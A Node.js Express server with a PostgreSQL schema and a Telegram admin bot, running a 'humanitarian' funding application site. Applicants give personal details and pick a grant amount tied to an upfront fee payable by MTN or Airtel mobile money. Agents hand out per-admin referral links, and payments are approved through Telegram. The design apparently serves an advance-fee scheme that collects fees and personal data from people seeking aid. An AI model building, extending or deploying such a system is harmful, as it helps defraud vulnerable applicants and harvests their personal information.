require("dotenv").config();
const express=require("express"),cors=require("cors"),path=require("path"),crypto=require("crypto"),{Pool}=require("pg");
const app=express(),PORT=process.env.PORT||10000;
if(!process.env.DATABASE_URL){console.error("DATABASE_URL is not configured");process.exit(1)}
const pool=new Pool({connectionString:process.env.DATABASE_URL,ssl:process.env.DATABASE_URL.includes("localhost")?false:{rejectUnauthorized:false}});
app.use(cors());app.use(express.json({limit:"200kb"}));app.use(express.static(path.join(__dirname,"public")));

const FUNDS=["ZMW 18,000 fee k499","ZMW 25,000 fee k699","ZMW 28,000 fee k899","ZMW 30,000 fee k1099","ZMW 35,000 fee k1299"];
const METHODS=["MTN","AIRTEL"];
const makeRef=()=>`WHF-${new Date().getFullYear()}-${crypto.randomBytes(3).toString("hex").toUpperCase()}`;
const randomToken=()=>crypto.randomBytes(32).toString("hex");
const hashToken=v=>crypto.createHash("sha256").update(String(v)).digest("hex");
const escHtml=(v)=>String(v??"").replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
const cookieName="whf_admin_session";

async function tg(method,payload){
  if(!process.env.TELEGRAM_BOT_TOKEN){console.error("Telegram token missing");return false}
  try{
    const r=await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/${method}`,{
      method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)
    });
    const t=await r.text();
    if(!r.ok)console.error("Telegram API:",r.status,t);
    return r.ok;
  }catch(e){console.error("Telegram request:",e.message);return false}
}

function getCookie(req,name){
  const raw=req.headers.cookie||"";
  for(const part of raw.split(";")){const [k,...v]=part.trim().split("=");if(k===name)return decodeURIComponent(v.join("="))}
  return null;
}
function setCookie(res,name,value,maxAge){
  const secure=process.env.NODE_ENV==="production"?"; Secure":"";
  res.setHeader("Set-Cookie",`${name}=${encodeURIComponent(value)}; Max-Age=${maxAge}; Path=/; HttpOnly; SameSite=Lax${secure}`);
}
function clearCookie(res,name){res.setHeader("Set-Cookie",`${name}=; Max-Age=0; Path=/; HttpOnly; SameSite=Lax`)}

async function init(){
 await pool.query(`CREATE TABLE IF NOT EXISTS admins(
 id SERIAL PRIMARY KEY,name VARCHAR(160) NOT NULL,role VARCHAR(20) NOT NULL DEFAULT 'ADMIN',
 token_hash VARCHAR(64) UNIQUE NOT NULL,customer_token_hash VARCHAR(64) UNIQUE,active BOOLEAN NOT NULL DEFAULT TRUE,
 created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),last_seen_at TIMESTAMPTZ);
 ALTER TABLE admins ADD COLUMN IF NOT EXISTS customer_token_hash VARCHAR(64);
 CREATE TABLE IF NOT EXISTS applications(
 id SERIAL PRIMARY KEY,reference VARCHAR(32) UNIQUE NOT NULL,full_name VARCHAR(160) NOT NULL,
 age INTEGER NOT NULL,phone VARCHAR(40) NOT NULL,country VARCHAR(100) NOT NULL,
 location VARCHAR(160) NOT NULL,occupation VARCHAR(120) NOT NULL,zone VARCHAR(120),
 purpose VARCHAR(80) NOT NULL,participated_before BOOLEAN NOT NULL DEFAULT FALSE,
 requested_fund VARCHAR(30),payment_method VARCHAR(20),status VARCHAR(30) NOT NULL DEFAULT 'PENDING',
 customer_contact_number VARCHAR(40),owner_admin_id INTEGER REFERENCES admins(id),created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),reviewed_at TIMESTAMPTZ);
 ALTER TABLE applications ADD COLUMN IF NOT EXISTS requested_fund VARCHAR(30);
 ALTER TABLE applications ADD COLUMN IF NOT EXISTS payment_method VARCHAR(20);
 ALTER TABLE applications ADD COLUMN IF NOT EXISTS customer_contact_number VARCHAR(40);
 ALTER TABLE applications ADD COLUMN IF NOT EXISTS owner_admin_id INTEGER REFERENCES admins(id);
 CREATE INDEX IF NOT EXISTS idx_applications_owner_admin_id ON applications(owner_admin_id);
 CREATE TABLE IF NOT EXISTS payments(
 id SERIAL PRIMARY KEY,application_id INTEGER REFERENCES applications(id) ON DELETE CASCADE,
 method VARCHAR(20) NOT NULL,transaction_reference VARCHAR(120),statement TEXT,
 amount NUMERIC(12,2),status VARCHAR(30) NOT NULL DEFAULT 'PENDING',
 created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),verified_at TIMESTAMPTZ);
 ALTER TABLE payments ADD COLUMN IF NOT EXISTS transaction_reference VARCHAR(120);
 ALTER TABLE payments ADD COLUMN IF NOT EXISTS statement TEXT;
 ALTER TABLE payments ADD COLUMN IF NOT EXISTS verified_at TIMESTAMPTZ;
 ALTER TABLE payments ALTER COLUMN transaction_reference DROP NOT NULL;
 ALTER TABLE payments ALTER COLUMN amount DROP NOT NULL;
 ALTER TABLE payments ALTER COLUMN statement DROP NOT NULL;
 CREATE TABLE IF NOT EXISTS admin_sessions(
 id SERIAL PRIMARY KEY,admin_id INTEGER REFERENCES admins(id) ON DELETE CASCADE,
 session_hash VARCHAR(64) UNIQUE NOT NULL,expires_at TIMESTAMPTZ NOT NULL,created_at TIMESTAMPTZ NOT NULL DEFAULT NOW());
 CREATE INDEX IF NOT EXISTS idx_admin_sessions_hash ON admin_sessions(session_hash);
 CREATE INDEX IF NOT EXISTS idx_admins_token_hash ON admins(token_hash);
 CREATE INDEX IF NOT EXISTS idx_admins_customer_token_hash ON admins(customer_token_hash);`);
 console.log("Database ready");
 await ensureSuperAdmin();
}

async function ensureSuperAdmin(){
 const id=String(process.env.SUPER_ADMIN_TELEGRAM_ID||"").trim();
 if(!id)return;
 const existing=await pool.query("SELECT id FROM admins WHERE role='SUPER_ADMIN' LIMIT 1");
 if(!existing.rows.length){
   const token=randomToken();
   await pool.query("INSERT INTO admins(name,role,token_hash) VALUES($1,'SUPER_ADMIN',$2)",[process.env.SUPER_ADMIN_NAME||"Super Admin",hashToken(token)]);
   console.log("Super admin record created. Use /adminlink in Telegram to create portal admins.");
 }
}

async function registerWebhook(){
 if(!process.env.TELEGRAM_WEBHOOK_URL)return;
 const p={url:process.env.TELEGRAM_WEBHOOK_URL,allowed_updates:["callback_query","message"]};
 if(process.env.TELEGRAM_WEBHOOK_SECRET)p.secret_token=process.env.TELEGRAM_WEBHOOK_SECRET;
 await tg("setWebhook",p);
 console.log("Telegram webhook registered");
}

async function authAdmin(req,res,next){
 try{
   const session=getCookie(req,cookieName);
   if(!session)return res.status(401).json({error:"Admin authentication required."});
   const r=await pool.query(`SELECT a.id,a.name,a.role,a.active
     FROM admin_sessions s JOIN admins a ON a.id=s.admin_id
     WHERE s.session_hash=$1 AND s.expires_at>NOW() AND a.active=TRUE`,[hashToken(session)]);
   if(!r.rows.length){clearCookie(res,cookieName);return res.status(401).json({error:"Admin session expired or revoked."})}
   req.admin=r.rows[0];
   await pool.query("UPDATE admins SET last_seen_at=NOW() WHERE id=$1",[req.admin.id]);
   next();
 }catch(e){console.error("ADMIN AUTH",e);res.status(500).json({error:"Unable to authenticate admin."})}
}

function superAdminTelegramIds(){
 return String(process.env.SUPER_ADMIN_TELEGRAM_ID||"").split(",").map(x=>x.trim()).filter(Boolean);
}
function isSuperTelegram(userId){return superAdminTelegramIds().includes(String(userId))}
function adminPortalBase(){return String(process.env.ADMIN_PORTAL_URL||process.env.TELEGRAM_WEBHOOK_URL||"").replace(/\/telegram\/webhook\/?$/,"/admin").replace(/\/$/,"")}
function customerPortalBase(){
 const explicit=String(process.env.CUSTOMER_APPLICATION_URL||"").trim();
 if(explicit)return explicit.replace(/\/$/,"");
 const admin=adminPortalBase();
 return admin.replace(/\/admin\/?$/,"/").replace(/\/$/,"");
}
async function resolveCustomerOwner(token){
 const t=String(token||"").trim();
 if(!t)return null;
 const r=await pool.query("SELECT id,name,role,active FROM admins WHERE customer_token_hash=$1 AND role='ADMIN' AND active=TRUE",[hashToken(t)]);
 return r.rows[0]||null;
}
async function sendAdminAudit(text){
 const chatId=process.env.TELEGRAM_ADMIN_CHAT_ID;
 if(chatId)await tg("sendMessage",{chat_id:chatId,parse_mode:"HTML",text});
}

app.get("/health",async(_,res)=>{
 try{await pool.query("SELECT 1");res.json({status:"OK",database:"CONNECTED"})}
 catch(e){res.status(500).json({status:"ERROR",database:"NOT CONNECTED"})}
});

app.get("/api/config",(_,res)=>res.json({
 fundingOptions:FUNDS,paymentMethods:METHODS,
 mtnNumber:process.env.MTN_PAYMENT_NUMBER||"",
 airtelNumber:process.env.AIRTEL_PAYMENT_NUMBER||"",
 customerContactNumber:process.env.CUSTOMER_CONTACT_NUMBER||""
}));

app.post("/api/applications",async(req,res)=>{
 try{
  const {full_name,age,phone,country,location,occupation,zone,purpose,participated_before,customer_token}=req.body;
  if(!full_name||!age||!phone||!country||!location||!occupation||!purpose)
    return res.status(400).json({error:"Complete all required application details."});
  const owner=await resolveCustomerOwner(customer_token);
  if(!owner)return res.status(403).json({error:"This application link is invalid or has been revoked. Please use the application link provided by your administrator."});
  const reference=makeRef();
  const r=await pool.query(`INSERT INTO applications
   (reference,full_name,age,phone,country,location,occupation,zone,purpose,participated_before,owner_admin_id)
   VALUES($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11) RETURNING *`,
   [reference,String(full_name).trim(),Number(age),String(phone).trim(),String(country).trim(),
    String(location).trim(),String(occupation).trim(),zone||null,String(purpose).trim(),
    participated_before==="true"||participated_before===true,owner.id]);
  const a=r.rows[0];
  const sent=await tg("sendMessage",{
    chat_id:process.env.TELEGRAM_ADMIN_CHAT_ID,parse_mode:"HTML",
    text:`🆕 <b>NEW HUMANITARIAN APPLICATION</b>\n\nReference: <b>${escHtml(a.reference)}</b>\nName: ${escHtml(a.full_name)}\nAge: ${a.age}\nPhone: ${escHtml(a.phone)}\nCountry: ${escHtml(a.country)}\nLocation: ${escHtml(a.location)}\nOccupation: ${escHtml(a.occupation)}\nPurpose: ${escHtml(a.purpose)}\n\nStatus: PENDING
Assigned admin: <b>${escHtml(owner.name)}</b>`,
    reply_markup:{inline_keyboard:[[
      {text:"📋 REVIEW APPLICATION",callback_data:`review:${a.id}`},
      {text:"❌ REJECT",callback_data:`reject:${a.id}`}
    ]]}
  });
  console.log(`Application ${a.reference}: Telegram ${sent?"SENT":"FAILED"}`);
  res.json({success:true,reference:a.reference,status:a.status,telegramSent:sent});
 }catch(e){console.error("APPLICATION ERROR",e);res.status(500).json({error:"Unable to submit application."})}
});

app.post("/api/applications/:reference/funding",async(req,res)=>{
 try{
  const {requested_fund,payment_method,customer_token}=req.body;
  const normalizedFund=String(requested_fund||"").replace(/ fee (?!k)/i," fee k");
  if(!FUNDS.includes(normalizedFund))return res.status(400).json({error:"Invalid funding selection."});
  if(!METHODS.includes(payment_method))return res.status(400).json({error:"Invalid payment method."});
  const owner=await resolveCustomerOwner(customer_token);
  if(!owner)return res.status(403).json({error:"Invalid or revoked application link."});
  const r=await pool.query(`UPDATE applications SET requested_fund=$1,payment_method=$2 WHERE reference=$3 AND owner_admin_id=$4 RETURNING *`,[normalizedFund,payment_method,req.params.reference,owner.id]);
  if(!r.rows.length)return res.status(404).json({error:"Application not found for this administrator."});
  const a=r.rows[0];
  const sent=await tg("sendMessage",{
    chat_id:process.env.TELEGRAM_ADMIN_CHAT_ID,parse_mode:"HTML",
    text:`💰 <b>FUNDING & PAYMENT METHOD SELECTED</b>\n\nReference: <b>${escHtml(a.reference)}</b>\nCustomer: ${escHtml(a.full_name)}\nPhone: ${escHtml(a.phone)}\nRequested funding: <b>${escHtml(a.requested_fund)}</b>\nPayment method: <b>${escHtml(a.payment_method)}</b>\n\nPlease review the application and respond through the admin controls.`,
    reply_markup:{inline_keyboard:[[
      {text:"✅ APPROVE",callback_data:`approve:${a.id}`},
      {text:"❌ REJECT",callback_data:`reject:${a.id}`}
    ],[
      {text:"📞 USE ACTIVE CONTACT",callback_data:`contact:${a.id}`}
    ]]}
  });
  console.log(`Funding selection ${a.reference}: Telegram ${sent?"SENT":"FAILED"}`);
  res.json({success:true,reference:a.reference,requested_fund:a.requested_fund,payment_method:a.payment_method});
 }catch(e){console.error("FUNDING ERROR",e);res.status(500).json({error:"Unable to save selection."})}
});

app.post("/api/payments",async(req,res)=>{
 try{
  const {reference,method,transaction_reference,statement,amount,customer_token}=req.body;
  if(!reference||!method||!String(statement).trim())return res.status(400).json({error:"Paste the complete payment confirmation message before submitting."});
  const cleanStatement=String(statement).trim();
  if(!METHODS.includes(method))return res.status(400).json({error:"Invalid payment method."});
  const owner=await resolveCustomerOwner(customer_token);
  if(!owner)return res.status(403).json({error:"Invalid or revoked application link."});
  const a=await pool.query("SELECT id,full_name,requested_fund FROM applications WHERE reference=$1 AND owner_admin_id=$2",[reference,owner.id]);
  if(!a.rows.length)return res.status(404).json({error:"Application not found for this administrator."});
  const p=await pool.query(`INSERT INTO payments(application_id,method,transaction_reference,statement,amount)
    VALUES($1,$2,$3,$4,$5) RETURNING id`,
    [a.rows[0].id,method,transaction_reference?String(transaction_reference).trim():null,
     cleanStatement,amount!==undefined&&amount!==null&&String(amount).trim()!==""?Number(amount):null]);
  const sent=await tg("sendMessage",{
    chat_id:process.env.TELEGRAM_ADMIN_CHAT_ID,parse_mode:"HTML",
    text:`💳 <b>PAYMENT INFORMATION RECEIVED</b>\n\nApplication: <b>${escHtml(reference)}</b>\nCustomer: ${escHtml(a.rows[0].full_name)}\nRequested funding: ${escHtml(a.rows[0].requested_fund||"N/A")}\nMethod: ${escHtml(method)}\nTransaction: ${escHtml(transaction_reference||"N/A")}\nAmount: ${escHtml(amount||"N/A")}\n\n<b>Statement:</b>\n${escHtml(cleanStatement).slice(0,3500)}`,
    reply_markup:{inline_keyboard:[[
      {text:"✅ VERIFY PAYMENT",callback_data:`payverify:${p.rows[0].id}`},
      {text:"❌ REJECT PAYMENT",callback_data:`payreject:${p.rows[0].id}`}
    ]]}
  });
  console.log(`Payment ${p.rows[0].id}: Telegram ${sent?"SENT":"FAILED"}`);
  res.json({success:true,status:"PENDING"});
 }catch(e){console.error("PAYMENT ERROR:",e.message,e.stack);res.status(500).json({error:"Unable to submit payment information."})}
});

app.get("/api/applications/:reference",async(req,res)=>{
 try{
  const r=await pool.query(`SELECT reference,status,requested_fund,payment_method,customer_contact_number FROM applications WHERE reference=$1`,[req.params.reference]);
  if(!r.rows.length)return res.status(404).json({error:"Application not found."});
  res.json(r.rows[0]);
 }catch(e){res.status(500).json({error:"Unable to check status."})}
});

app.post("/api/admin/applications/:id/contact",authAdmin,async(req,res)=>{
 try{
  const {contact_number}=req.body;
  if(!contact_number)return res.status(400).json({error:"Contact number required."});
  const r=await pool.query(`UPDATE applications SET customer_contact_number=$1 WHERE id=$2 AND ($3='SUPER_ADMIN' OR owner_admin_id=$4) RETURNING reference,customer_contact_number`,[String(contact_number).trim(),req.params.id,req.admin.role,req.admin.id]);
  if(!r.rows.length)return res.status(404).json({error:"Application not found for this administrator."});
  await sendAdminAudit(`📞 <b>CUSTOMER CONTACT ASSIGNED</b>\nReference: <b>${escHtml(r.rows[0].reference)}</b>\nContact: <b>${escHtml(r.rows[0].customer_contact_number)}</b>\nAssigned by: <b>${escHtml(req.admin.name)}</b>`);
  res.json(r.rows[0]);
 }catch(e){res.status(500).json({error:"Unable to save contact number."})}
});

app.post("/api/admin/login",async(req,res)=>{
 try{
  const token=String(req.body.token||"").trim();
  if(!token)return res.status(400).json({error:"Admin access token is required."});
  const r=await pool.query("SELECT id,name,role,active FROM admins WHERE token_hash=$1 AND active=TRUE",[hashToken(token)]);
  if(!r.rows.length)return res.status(401).json({error:"Invalid or revoked admin link."});
  const session=randomToken();
  await pool.query("INSERT INTO admin_sessions(admin_id,session_hash,expires_at) VALUES($1,$2,NOW()+INTERVAL '30 days')",[r.rows[0].id,hashToken(session)]);
  setCookie(res,cookieName,session,60*60*24*30);
  await pool.query("UPDATE admins SET last_seen_at=NOW() WHERE id=$1",[r.rows[0].id]);
  res.json({success:true,admin:r.rows[0]});
 }catch(e){console.error("ADMIN LOGIN",e);res.status(500).json({error:"Unable to sign in."})}
});
app.post("/api/admin/logout",async(req,res)=>{try{const s=getCookie(req,cookieName);if(s)await pool.query("DELETE FROM admin_sessions WHERE session_hash=$1",[hashToken(s)]);clearCookie(res,cookieName);res.json({success:true})}catch(e){res.status(500).json({error:"Unable to sign out."})}});
app.get("/api/admin/me",authAdmin,(req,res)=>res.json({admin:req.admin}));
app.get("/api/admin/dashboard",authAdmin,async(req,res)=>{
 try{
  const apps=await pool.query(`SELECT a.id,a.reference,a.full_name,a.age,a.phone,a.country,a.location,a.occupation,a.purpose,a.requested_fund,a.payment_method,a.status,a.customer_contact_number,a.owner_admin_id,a.created_at,a.reviewed_at,
    COALESCE((SELECT json_agg(json_build_object('id',p.id,'method',p.method,'transaction_reference',p.transaction_reference,'statement',p.statement,'amount',p.amount,'status',p.status,'created_at',p.created_at,'verified_at',p.verified_at) ORDER BY p.created_at DESC) FROM payments p WHERE p.application_id=a.id),'[]'::json) AS payments
    FROM applications a WHERE ($1='SUPER_ADMIN' OR a.owner_admin_id=$2) ORDER BY a.created_at DESC LIMIT 300`,[req.admin.role,req.admin.id]);
  const admins=req.admin.role==="SUPER_ADMIN"?await pool.query("SELECT id,name,role,active,created_at,last_seen_at FROM admins ORDER BY role DESC,created_at ASC"):null;
  res.json({applications:apps.rows,admins:admins?admins.rows:[]});
 }catch(e){console.error("DASHBOARD",e);res.status(500).json({error:"Unable to load admin dashboard."})}
});
app.post("/api/admin/applications/:id/decision",authAdmin,async(req,res)=>{
 try{
  const decision=String(req.body.decision||"").toUpperCase();
  if(!["APPROVED","REJECTED"].includes(decision))return res.status(400).json({error:"Invalid decision."});
  const r=await pool.query(`UPDATE applications SET status=$1,reviewed_at=NOW() WHERE id=$2 AND status='PENDING' AND ($3='SUPER_ADMIN' OR owner_admin_id=$4) RETURNING reference,full_name,requested_fund,payment_method,status`,[decision,req.params.id,req.admin.role,req.admin.id]);
  if(!r.rows.length)return res.status(409).json({error:"This application has already been reviewed."});
  await sendAdminAudit(`${decision==="APPROVED"?"✅":"❌"} <b>APPLICATION ${decision}</b>\nReference: <b>${escHtml(r.rows[0].reference)}</b>\nCustomer: ${escHtml(r.rows[0].full_name)}\nReviewed by: <b>${escHtml(req.admin.name)}</b>`);
  res.json({success:true,application:r.rows[0]});
 }catch(e){console.error("APP DECISION",e);res.status(500).json({error:"Unable to update application."})}
});
app.post("/api/admin/payments/:id/decision",authAdmin,async(req,res)=>{
 try{
  const decision=String(req.body.decision||"").toUpperCase();
  if(!["VERIFIED","REJECTED"].includes(decision))return res.status(400).json({error:"Invalid payment decision."});
  const r=await pool.query(`UPDATE payments SET status=$1,verified_at=NOW() WHERE id=$2 AND status='PENDING' AND EXISTS (SELECT 1 FROM applications a WHERE a.id=payments.application_id AND ($3='SUPER_ADMIN' OR a.owner_admin_id=$4)) RETURNING id,application_id,status`,[decision,req.params.id,req.admin.role,req.admin.id]);
  if(!r.rows.length)return res.status(409).json({error:"This payment has already been reviewed."});
  const a=await pool.query("SELECT reference,full_name FROM applications WHERE id=$1",[r.rows[0].application_id]);
  await sendAdminAudit(`${decision==="VERIFIED"?"✅":"❌"} <b>PAYMENT ${decision}</b>\nReference: <b>${escHtml(a.rows[0]?.reference||"N/A")}</b>\nCustomer: ${escHtml(a.rows[0]?.full_name||"N/A")}\nReviewed by: <b>${escHtml(req.admin.name)}</b>`);
  res.json({success:true,payment:r.rows[0]});
 }catch(e){console.error("PAY DECISION",e);res.status(500).json({error:"Unable to update payment."})}
});
app.post("/api/admin/create-link",authAdmin,async(req,res)=>{
 try{
  if(req.admin.role!=="SUPER_ADMIN")return res.status(403).json({error:"Only the super admin can create admin links."});
  const name=String(req.body.name||"").trim();
  if(!name)return res.status(400).json({error:"Admin name is required."});
  const token=randomToken(),customerToken=randomToken();
  const r=await pool.query("INSERT INTO admins(name,role,token_hash,customer_token_hash) VALUES($1,'ADMIN',$2,$3) RETURNING id,name,role,created_at",[name,hashToken(token),hashToken(customerToken)]);
  const link=`${adminPortalBase()}?token=${token}`;
  const customerLink=`${customerPortalBase()}?agent=${customerToken}`;
  res.json({success:true,admin:r.rows[0],link,customerLink});
 }catch(e){console.error("CREATE LINK",e);res.status(500).json({error:"Unable to create admin link."})}
});
app.post("/api/admin/revoke/:id",authAdmin,async(req,res)=>{
 try{
  if(req.admin.role!=="SUPER_ADMIN")return res.status(403).json({error:"Only the super admin can revoke admins."});
  if(String(req.params.id)===String(req.admin.id))return res.status(400).json({error:"You cannot revoke yourself."});
  const r=await pool.query("UPDATE admins SET active=FALSE WHERE id=$1 AND role='ADMIN' RETURNING id,name",[req.params.id]);
  if(!r.rows.length)return res.status(404).json({error:"Admin not found."});
  await pool.query("DELETE FROM admin_sessions WHERE admin_id=$1",[req.params.id]);
  res.json({success:true,admin:r.rows[0]});
 }catch(e){res.status(500).json({error:"Unable to revoke admin."})}
});

async function handleTelegramCallback(q){
 try{
  const raw=String(q.data||"");
  const parts=raw.split(":");
  const action=parts[0];
  const id=Number(parts[1]);
  if(!Number.isInteger(id)||id<=0){
    await tg("answerCallbackQuery",{callback_query_id:q.id,text:"Invalid approval action.",show_alert:true});
    return;
  }
  if(!isSuperTelegram(q.from?.id)){
    await tg("answerCallbackQuery",{callback_query_id:q.id,text:"Only the Super Admin can use Telegram approval controls.",show_alert:true});
    return;
  }

  // Always acknowledge the button quickly so Telegram does not leave the spinner running.
  await tg("answerCallbackQuery",{callback_query_id:q.id,text:"Processing...",show_alert:false});

  if(["approve","reject"].includes(action)){
    const status=action==="approve"?"APPROVED":"REJECTED";
    const r=await pool.query(`UPDATE applications SET status=$1,reviewed_at=NOW()
      WHERE id=$2 AND status='PENDING'
      RETURNING id,reference,full_name,requested_fund,payment_method,status,owner_admin_id`,[status,id]);
    if(!r.rows.length){
      await tg("answerCallbackQuery",{callback_query_id:q.id,text:"Already reviewed or application not found.",show_alert:true});
      return;
    }
    const a=r.rows[0];
    await sendAdminAudit(`${status==="APPROVED"?"✅":"❌"} <b>APPLICATION ${status}</b>\nReference: <b>${escHtml(a.reference)}</b>\nCustomer: ${escHtml(a.full_name)}\nReviewed by: <b>Super Admin (Telegram)</b>`);
    await tg("editMessageText",{chat_id:q.message.chat.id,message_id:q.message.message_id,parse_mode:"HTML",
      text:`${status==="APPROVED"?"✅":"❌"} <b>APPLICATION ${status}</b>\n\nReference: <b>${escHtml(a.reference)}</b>\nCustomer: ${escHtml(a.full_name)}\nRequested funding: <b>${escHtml(a.requested_fund||"N/A")}</b>\nPayment method: <b>${escHtml(a.payment_method||"N/A")}</b>\nReviewed by: <b>Super Admin</b>`});
    return;
  }

  if(action==="review"){
    const r=await pool.query(`SELECT id,reference,full_name,age,phone,country,location,occupation,purpose,
      requested_fund,payment_method,status,owner_admin_id FROM applications WHERE id=$1`,[id]);
    if(!r.rows.length){
      await tg("answerCallbackQuery",{callback_query_id:q.id,text:"Application not found.",show_alert:true});
      return;
    }
    const a=r.rows[0];
    await tg("sendMessage",{chat_id:q.message.chat.id,parse_mode:"HTML",
      text:`📋 <b>APPLICATION REVIEW</b>\n\nReference: <b>${escHtml(a.reference)}</b>\nName: ${escHtml(a.full_name)}\nAge: ${a.age}\nPhone: ${escHtml(a.phone)}\nCountry: ${escHtml(a.country)}\nLocation: ${escHtml(a.location)}\nOccupation: ${escHtml(a.occupation)}\nPurpose: ${escHtml(a.purpose)}\nFunding: ${escHtml(a.requested_fund||"N/A")}\nMethod: ${escHtml(a.payment_method||"N/A")}\nStatus: <b>${escHtml(a.status)}</b>`,
      reply_markup:{inline_keyboard:[[ {text:"✅ APPROVE",callback_data:`approve:${id}`},{text:"❌ REJECT",callback_data:`reject:${id}`} ]]}});
    return;
  }

  if(action==="contact"){
    await tg("answerCallbackQuery",{callback_query_id:q.id,text:"Assign the customer contact from the admin portal.",show_alert:true});
    return;
  }

  if(["payverify","payreject"].includes(action)){
    const status=action==="payverify"?"VERIFIED":"REJECTED";
    const r=await pool.query(`UPDATE payments SET status=$1,verified_at=NOW()
      WHERE id=$2 AND status='PENDING'
      AND EXISTS(SELECT 1 FROM applications a WHERE a.id=payments.application_id)
      RETURNING id,application_id,status`,[status,id]);
    if(!r.rows.length){
      await tg("answerCallbackQuery",{callback_query_id:q.id,text:"Payment already reviewed or not found.",show_alert:true});
      return;
    }
    const a=await pool.query("SELECT reference,full_name FROM applications WHERE id=$1",[r.rows[0].application_id]);
    await sendAdminAudit(`${status==="VERIFIED"?"✅":"❌"} <b>PAYMENT ${status}</b>\nReference: <b>${escHtml(a.rows[0]?.reference||"N/A")}</b>\nCustomer: ${escHtml(a.rows[0]?.full_name||"N/A")}\nReviewed by: <b>Super Admin (Telegram)</b>`);
    await tg("editMessageText",{chat_id:q.message.chat.id,message_id:q.message.message_id,parse_mode:"HTML",
      text:`${status==="VERIFIED"?"✅":"❌"} <b>PAYMENT ${status}</b>\n\nReference: <b>${escHtml(a.rows[0]?.reference||"N/A")}</b>\nCustomer: ${escHtml(a.rows[0]?.full_name||"N/A")}\nReviewed by: <b>Super Admin</b>`});
    return;
  }

  await tg("answerCallbackQuery",{callback_query_id:q.id,text:"Unknown approval action.",show_alert:true});
 }catch(e){
  console.error("TELEGRAM CALLBACK ERROR",e);
  try{await tg("answerCallbackQuery",{callback_query_id:q.id,text:"Unable to process this action. Please try again.",show_alert:true})}catch{}
 }
}

async function handleTelegramMessage(m){
 const text=String(m.text||"").trim();
 if(!text.startsWith("/"))return;
 const [cmd,...args]=text.split(/\s+/);const command=cmd.split("@")[0].toLowerCase();
 if(command==="/start"||command==="/help"){
   return tg("sendMessage",{chat_id:m.chat.id,parse_mode:"HTML",text:`🤖 <b>WHF Admin Bot</b>\n\nUse /adminlink NAME to create a portal admin link.\nUse /admins to view admins.\nUse /customerlink ID to regenerate a customer application link.\nUse /revoke ID to revoke an admin.\nUse /myid to see your Telegram ID.`});
 }
 if(command==="/myid")return tg("sendMessage",{chat_id:m.chat.id,text:`Your Telegram ID: ${m.from?.id}`});
 if(!isSuperTelegram(m.from?.id))return tg("sendMessage",{chat_id:m.chat.id,text:"Access denied. This command is for the super admin only."});
 if(command==="/adminlink"||command==="/newadmin"){
   const name=args.join(" ").trim();
   if(!name)return tg("sendMessage",{chat_id:m.chat.id,text:"Usage: /adminlink John Doe"});
   const token=randomToken(),customerToken=randomToken();
   const r=await pool.query("INSERT INTO admins(name,role,token_hash,customer_token_hash) VALUES($1,'ADMIN',$2,$3) RETURNING id,name,created_at",[name,hashToken(token),hashToken(customerToken)]);
   const link=`${adminPortalBase()}?token=${token}`;
   const customerLink=`${customerPortalBase()}?agent=${customerToken}`;
   return tg("sendMessage",{chat_id:m.chat.id,parse_mode:"HTML",text:`✅ <b>ADMIN CREATED</b>\n\nID: <b>${r.rows[0].id}</b>\nName: <b>${escHtml(name)}</b>\n\n🔐 <b>Admin portal:</b>\n${escHtml(link)}\n\n🔗 <b>Customer application link:</b>\n${escHtml(customerLink)}\n\nGive the first link to the admin. Give the second link to customers who belong to this admin. The admin will only see applications submitted through their customer link.`});
 }
 if(command==="/admins"){
   const r=await pool.query("SELECT id,name,role,active,created_at,last_seen_at FROM admins ORDER BY role DESC,id ASC");
   const lines=r.rows.map(a=>`#${a.id} ${a.name} — ${a.role} — ${a.active?"ACTIVE":"REVOKED"}${a.last_seen_at?` — last seen ${new Date(a.last_seen_at).toLocaleString()}`:""}`);
   return tg("sendMessage",{chat_id:m.chat.id,parse_mode:"HTML",text:`👥 <b>ADMINS</b>\n\n${lines.length?lines.map(escHtml).join("\n"):"No admins yet."}`});
 }
 if(command==="/revoke"){
   const id=Number(args[0]);
   if(!id)return tg("sendMessage",{chat_id:m.chat.id,text:"Usage: /revoke ADMIN_ID"});
   const r=await pool.query("UPDATE admins SET active=FALSE WHERE id=$1 AND role='ADMIN' RETURNING id,name",[id]);
   await pool.query("DELETE FROM admin_sessions WHERE admin_id=$1",[id]);
   return tg("sendMessage",{chat_id:m.chat.id,text:r.rows.length?`✅ Admin ${r.rows[0].name} revoked.`:"Admin not found."});
 }
 if(command==="/customerlink"){
   const id=Number(args[0]);
   if(!id)return tg("sendMessage",{chat_id:m.chat.id,text:"Usage: /customerlink ADMIN_ID"});
   const customerToken=randomToken();
   const r=await pool.query("UPDATE admins SET customer_token_hash=$1 WHERE id=$2 AND role='ADMIN' AND active=TRUE RETURNING id,name",[hashToken(customerToken),id]);
   if(!r.rows.length)return tg("sendMessage",{chat_id:m.chat.id,text:"Active admin not found."});
   const customerLink=`${customerPortalBase()}?agent=${customerToken}`;
   return tg("sendMessage",{chat_id:m.chat.id,parse_mode:"HTML",text:`🔗 <b>CUSTOMER APPLICATION LINK</b>\n\nAdmin: <b>${escHtml(r.rows[0].name)}</b>\n\n${escHtml(customerLink)}\n\nShare this link with customers assigned to this admin.`});
 }
 if(command==="/portal")return tg("sendMessage",{chat_id:m.chat.id,parse_mode:"HTML",text:`Open the admin portal: ${escHtml(adminPortalBase())}`});
 return tg("sendMessage",{chat_id:m.chat.id,text:"Unknown command. Use /help."});
}

app.post("/telegram/webhook",async(req,res)=>{
 try{
  if(process.env.TELEGRAM_WEBHOOK_SECRET&&req.get("x-telegram-bot-api-secret-token")!==process.env.TELEGRAM_WEBHOOK_SECRET)return res.sendStatus(401);
  if(req.body.callback_query)await handleTelegramCallback(req.body.callback_query);
  else if(req.body.message)await handleTelegramMessage(req.body.message);
  res.sendStatus(200);
 }catch(e){console.error("WEBHOOK ERROR",e);res.sendStatus(500)}
});

app.get("/admin",(_,res)=>res.sendFile(path.join(__dirname,"public","admin.html")));
app.get("*",(_,res)=>res.sendFile(path.join(__dirname,"public","index.html")));
(async()=>{try{await init();await registerWebhook();app.listen(PORT,()=>console.log(`Server running on ${PORT}`))}catch(e){console.error("STARTUP ERROR",e);process.exit(1)}})();
